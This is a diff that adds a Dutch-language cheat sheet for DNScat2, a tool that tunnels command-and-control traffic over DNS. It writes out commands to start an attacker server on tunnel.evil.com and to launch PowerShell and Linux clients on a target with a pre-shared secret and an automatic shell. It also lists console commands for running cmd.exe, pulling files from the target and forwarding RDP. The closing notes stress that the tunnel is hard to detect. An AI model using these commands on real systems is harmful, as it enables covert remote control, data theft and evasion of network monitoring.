@@ -1,0 +1,52 @@
+# DNScat2 — DNS tunneling voor C2 communicatie
+# Tunnelt data over DNS queries — werkt als alleen DNS verkeer is toegestaan
+#
+# === Syntax ===
+# Server: ruby dnscat2.rb DOMAIN [opties]
+# Client: Start-Dnscat2 -Domain DOMAIN -DNSServer ATTACKER_IP
+#
+# === Server opties (Linux/Ruby) ===
+# --secret=SECRET     Gedeelde geheime sleutel (encryptie)
+# --no-cache          Geen DNS caching
+# --security=open     Geen encryptie (niet aanbevolen)
+# -e open             Sta niet-geauthenticeerde sessies toe
+#
+# === Client opties (PowerShell) ===
+# -Domain DOMAIN       DNS domein voor tunneling
+# -DNSServer IP        DNS server (attacker IP)
+# -PreSharedSecret S   Gedeelde sleutel (moet matchen met server)
+# -ExecPS              Start PowerShell sessie automatisch
+#
+# === Voorbeelden ===
+
+# === Server starten (attacker — Linux) ===
+ruby dnscat2.rb tunnel.evil.com --secret=SuperGeheim123
+
+# Server zonder domein (direct mode)
+ruby dnscat2.rb --dns "server=0.0.0.0,port=53" --secret=SuperGeheim123
+
+# === Client starten (doelwit — PowerShell) ===
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -Domain tunnel.evil.com -DNSServer ATTACKER_IP
+
+# Met pre-shared secret
+Start-Dnscat2 -Domain tunnel.evil.com -DNSServer ATTACKER_IP -PreSharedSecret SuperGeheim123
+
+# Met automatische PowerShell sessie
+Start-Dnscat2 -Domain tunnel.evil.com -DNSServer ATTACKER_IP -PreSharedSecret SuperGeheim123 -ExecPS
+
+# === Server commando's (in dnscat2 console) ===
+# sessions         Toon actieve sessies
+# session -i N     Interactie met sessie N
+# shell            Start shell in huidige sessie
+# exec cmd.exe     Voer commando uit
+# download FILE    Download bestand van doelwit
+# upload FILE      Upload bestand naar doelwit
+# listen 0.0.0.0:4444 TARGET:3389    Port forward
+
+# === Linux client (C binary) ===
+./dnscat --dns domain=tunnel.evil.com,server=ATTACKER_IP --secret=SuperGeheim123
+
+# Noot: Vereist dat DNS verkeer naar attacker gaat (NS record of directe DNS)
+# Noot: Traag maar zeer lastig te detecteren bij correct DNS setup
+# Noot: Configureer NS record: tunnel.evil.com -> ATTACKER_IP
